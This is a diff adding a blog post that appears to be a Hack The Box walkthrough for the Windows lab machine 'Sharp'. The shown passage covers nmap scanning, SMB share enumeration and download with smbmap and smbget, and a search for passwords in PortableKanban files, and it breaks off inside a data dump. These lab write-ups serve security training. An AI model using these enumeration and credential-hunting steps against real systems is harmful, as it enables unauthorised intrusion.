@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 WindowsDifficulty:	HardPoints:	40Release:	05 Dec 2020IP:	10.10.10.219">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[sharp]">
+<meta property="og:url" content="https://fdlucifer.github.io/2021/01/08/sharp/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 WindowsDifficulty:	HardPoints:	40Release:	05 Dec 2020IP:	10.10.10.219">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb136.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb138.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb139.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb140.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb141.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb142.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb143.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb144.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb145.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb146.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb147.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb148.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb149.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb150.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb151.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb152.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb153.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb154.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb155.jpg">
+<meta property="article:published_time" content="2021-01-08T12:08:40.000Z">
+<meta property="article:modified_time" content="2021-05-03T05:48:53.193Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb136.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2021/01/08/sharp/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/01/08/sharp/","path":"2021/01/08/sharp/","title":"Hack-The-Box-walkthrough[sharp]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[sharp] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-gathering"><span class="nav-number">2.</span> <span class="nav-text">information gathering</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Enumeration"><span class="nav-number">3.</span> <span class="nav-text">Enumeration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB-enum"><span class="nav-number">4.</span> <span class="nav-text">SMB enum</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kaban-Files"><span class="nav-number">5.</span> <span class="nav-text">Kaban Files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Read-the-Docs"><span class="nav-number">6.</span> <span class="nav-text">Read the Docs</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sign-in-as-Admin"><span class="nav-number">7.</span> <span class="nav-text">Sign in as Admin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Config-Manipulation"><span class="nav-number">8.</span> <span class="nav-text">Config Manipulation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Password-Hunt"><span class="nav-number">9.</span> <span class="nav-text">Password Hunt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Make-Lars-Admin"><span class="nav-number">10.</span> <span class="nav-text">Make Lars Admin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Test-the-Creds"><span class="nav-number">11.</span> <span class="nav-text">Test the Creds</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB-enum-II"><span class="nav-number">12.</span> <span class="nav-text">SMB enum II</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#De-compiling"><span class="nav-number">13.</span> <span class="nav-text">De-compiling</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#In-Search-of-an-Exploit"><span class="nav-number">14.</span> <span class="nav-text">In Search of an Exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Compile-the-Exploit"><span class="nav-number">15.</span> <span class="nav-text">Compile the Exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-reverse-shell"><span class="nav-number">16.</span> <span class="nav-text">Create a reverse shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ysoserial-net"><span class="nav-number">17.</span> <span class="nav-text">ysoserial.net</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Remote-connection-exe"><span class="nav-number">18.</span> <span class="nav-text">Remote connection .exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Lars-Shell"><span class="nav-number">19.</span> <span class="nav-text">Lars Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Transfer"><span class="nav-number">20.</span> <span class="nav-text">Transfer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploring-WCF"><span class="nav-number">21.</span> <span class="nav-text">Exploring WCF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Build-the-Exploit"><span class="nav-number">22.</span> <span class="nav-text">Build the Exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Transfer-II"><span class="nav-number">23.</span> <span class="nav-text">Transfer II</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-number">24.</span> <span class="nav-text">Privilege Escalation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">25.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Contact-me"><span class="nav-number">26.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/01/08/sharp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[sharp] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[sharp]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-01-08 20:08:40" itemprop="dateCreated datePublished" datetime="2021-01-08T20:08:40+08:00">2021-01-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-05-03 13:48:53" itemprop="dateModified" datetime="2021-05-03T13:48:53+08:00">2021-05-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:	 Windows<br>Difficulty:	Hard<br>Points:	40<br>Release:	05 Dec 2020<br>IP:	10.10.10.219</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb136.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usaul</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/sharp]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.10.219</span></span><br><span class="line">PORT     STATE SERVICE         VERSION</span><br><span class="line">135/tcp  open  tcpwrapped</span><br><span class="line">139/tcp  open  netbios-ssn     Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">5985/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">8888/tcp open  sun-answerbook?</span><br><span class="line">8889/tcp open  ddi-tcp-2?</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
+
+<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>SMB on 149 and 445 is a good first port of call.</p>
+<h3 id="SMB-enum"><a href="#SMB-enum" class="headerlink" title="SMB enum"></a>SMB enum</h3><p>first run smbmap -H 10.10.10.219 which shows us the directories in the SMB share, and also the permissions that we do or do not have access to.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/sharp]</span><br><span class="line">└─<span class="comment"># smbmap -H 10.10.10.219</span></span><br><span class="line">[+] IP: 10.10.10.219:445        Name: localhost                                         </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        dev                                                     NO ACCESS</span><br><span class="line">        IPC$                                                    NO ACCESS       Remote IPC</span><br><span class="line">        kanban                                                  READ ONLY</span><br></pre></td></tr></table></figure>
+
+<p>The kaban directory is accessible to us. We can take a note of this name too, as it may be a username for later on. We can also use smbmap with the -R flag to list out all the files and directories inside of the shares that we have access to:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/sharp]</span><br><span class="line">└─<span class="comment"># smbmap -H 10.10.10.219 -R</span></span><br><span class="line">[+] IP: 10.10.10.219:445        Name: localhost                                         </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        dev                                                     NO ACCESS</span><br><span class="line">        IPC$                                                    NO ACCESS       Remote IPC</span><br><span class="line">        kanban                                                  READ ONLY</span><br><span class="line">        .\kanban\*</span><br><span class="line">        dr--r--r--                0 Sat Nov 14 13:57:04 2020    .</span><br><span class="line">        dr--r--r--                0 Sat Nov 14 13:57:04 2020    ..</span><br><span class="line">        fr--r--r--            58368 Sat Nov 14 13:57:04 2020    CommandLine.dll</span><br><span class="line">        fr--r--r--           141312 Sat Nov 14 13:57:04 2020    CsvHelper.dll</span><br><span class="line">        fr--r--r--           456704 Sat Nov 14 13:57:04 2020    DotNetZip.dll</span><br><span class="line">        dr--r--r--                0 Sat Nov 14 13:57:59 2020    Files</span><br><span class="line">        fr--r--r--            23040 Sat Nov 14 13:57:04 2020    Itenso.Rtf.Converter.Html.dll</span><br><span class="line">        fr--r--r--            75776 Sat Nov 14 13:57:04 2020    Itenso.Rtf.Interpreter.dll</span><br><span class="line">        fr--r--r--            32768 Sat Nov 14 13:57:04 2020    Itenso.Rtf.Parser.dll</span><br><span class="line">        fr--r--r--            19968 Sat Nov 14 13:57:04 2020    Itenso.Sys.dll</span><br><span class="line">        fr--r--r--           376832 Sat Nov 14 13:57:04 2020    MsgReader.dll</span><br><span class="line">        fr--r--r--           133296 Sat Nov 14 13:57:04 2020    Ookii.Dialogs.dll</span><br><span class="line">        fr--r--r--          2558011 Sat Nov 14 13:57:04 2020    pkb.zip</span><br><span class="line">        dr--r--r--                0 Sat Nov 14 13:57:04 2020    Plugins</span><br><span class="line">        fr--r--r--             5819 Sat Nov 14 13:57:04 2020    PortableKanban.cfg</span><br><span class="line">        fr--r--r--           118184 Sat Nov 14 13:57:04 2020    PortableKanban.Data.dll</span><br><span class="line">        fr--r--r--          1878440 Sat Nov 14 13:57:04 2020    PortableKanban.exe</span><br><span class="line">        fr--r--r--            31144 Sat Nov 14 13:57:04 2020    PortableKanban.Extensions.dll</span><br><span class="line">        fr--r--r--             2080 Sat Nov 14 13:57:04 2020    PortableKanban.pk3</span><br><span class="line">        fr--r--r--             2080 Sat Nov 14 13:57:04 2020    PortableKanban.pk3.bak</span><br><span class="line">        fr--r--r--               34 Sat Nov 14 13:57:04 2020    PortableKanban.pk3.md5</span><br><span class="line">        fr--r--r--           413184 Sat Nov 14 13:57:04 2020    ServiceStack.Common.dll</span><br><span class="line">        fr--r--r--           137216 Sat Nov 14 13:57:04 2020    ServiceStack.Interfaces.dll</span><br><span class="line">        fr--r--r--           292352 Sat Nov 14 13:57:04 2020    ServiceStack.Redis.dll</span><br><span class="line">        fr--r--r--           411648 Sat Nov 14 13:57:04 2020    ServiceStack.Text.dll</span><br><span class="line">        fr--r--r--          1050092 Sat Nov 14 13:57:04 2020    User Guide.pdf</span><br><span class="line">        .\kanban\Plugins\*</span><br><span class="line">        dr--r--r--                0 Sat Nov 14 13:57:04 2020    .</span><br><span class="line">        dr--r--r--                0 Sat Nov 14 13:57:04 2020    ..</span><br></pre></td></tr></table></figure>
+
+<p>To retrieve all of the files and save it to our machine, we can use</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbget -R smb://10.10.10.219/kanban</span><br></pre></td></tr></table></figure>
+
+<p>We downloaded some stuff for Windows, which may have to (de)compile. Before going to a Windows VM, however, I’d rather read through the files and docs and see if there are any quick and easy ways</p>
+<h3 id="Kaban-Files"><a href="#Kaban-Files" class="headerlink" title="Kaban Files"></a>Kaban Files</h3><p>use ack to search for strings that we think may be helpful - username, password, port, email, etc.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ack</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/sharp]</span><br><span class="line">└─<span class="comment"># ack -i &quot;password&quot;</span></span><br><span class="line">PortableKanban.pk3</span><br><span class="line">1:&#123;<span class="string">&quot;Columns&quot;</span>:[&#123;<span class="string">&quot;Id&quot;</span>:<span class="string">&quot;4757781032fd41b2a4511822e2c08850&quot;</span>,<span class="string">&quot;SortOrder&quot;</span>:0,<span class="string">&quot;Name&quot;</span>:<span class="string">&quot;Demo&quot;</span>,<span class="string">&quot;Limit&quot;</span>:0,<span class="string">&quot;TaskOrder&quot;</span>:&#123;<span class="string">&quot;SortType&quot;</span>:<span class="string">&quot;None&quot;</span>,<span class="string">&quot;Parameters&quot;</span>:[&#123;<span class="string">&quot;Field&quot;</span>:<span class="string">&quot;Completed&quot;</span>,<span class="string">&quot;SortOrder&quot;</span>:<span class="string">&quot;Descending&quot;</span>&#125;,&#123;<span class="string">&quot;Field&quot;</span>:<span class="string">&quot;Deadline&quot;</span>,<span class="string">&quot;SortOrder&quot;</span>:<span class="string">&quot;Ascending&quot;</span>&#125;,&#123;<span class="string">&quot;Field&quot;</span>:<span class="string">&quot;Priority&quot;</span>,<span class="string">&quot;SortOrder&quot;</span>:<span class="string">&quot;Descending&quot;</span>&#125;,&#123;<span class="string">&quot;Field&quot;</span>:<span class="string">&quot;Topic&quot;</span>,<span class="string">&quot;SortOrder&quot;</span>:<span class="string">&quot;Ascending&quot;</span>&#125;,&#123;<span class="string">&quot;Field&quot;</span>:<span class="string">&quot;Person&quot;</span>,<span class="string">&quot;SortOrder&quot;</span>:<span class="string">&quot;Ascending&quot;</span>&#125;]&#125;,<span class="string">&quot;AutoComplete&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;ResetCompleted&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;TimeStamp&quot;</span>:637409769443121006&#125;],<span class="string">&quot;Tasks&quot;</span>:[&#123;<span class="string">&quot;Id&quot;</span>:<span class="string">&quot;33870d6dfe4146718ba0b2c9f7bc05cf&quot;</span>,<span class="string">&quot;SeriesId&quot;</span>:<span class="string">&quot;00000000000000000000000000000000&quot;</span>,<span class="string">&quot;SortOrder&quot;</span>:<span class="string">&quot;oGdBKcFw&quot;</span>,<span class="string">&quot;ColumnId&quot;</span>:<span class="string">&quot;4757781032fd41b2a4511822e2c08850&quot;</span>,<span 